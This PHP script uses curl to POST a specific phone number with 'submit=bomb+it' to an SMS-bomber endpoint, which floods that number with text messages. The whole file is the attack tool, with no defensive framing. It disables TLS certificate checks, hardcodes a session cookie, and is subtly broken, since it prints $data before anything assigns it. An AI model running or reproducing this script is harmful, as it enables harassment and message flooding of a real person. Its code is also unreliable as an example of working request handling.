<?php
$url="http://vaibhav.ga/SMSBOMBER/send.php";

 $curl = curl_init();
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"number=7517263842&submit=bomb+it");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array('Cookie: __test=5b3ebf6ca9702bc58ff0d9ba48811942','Content-Type: application/x-www-form-urlencoded',
	'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
   var_dump($data);
   echo $data;  
   $ch = curl_exec($curl);
  

?>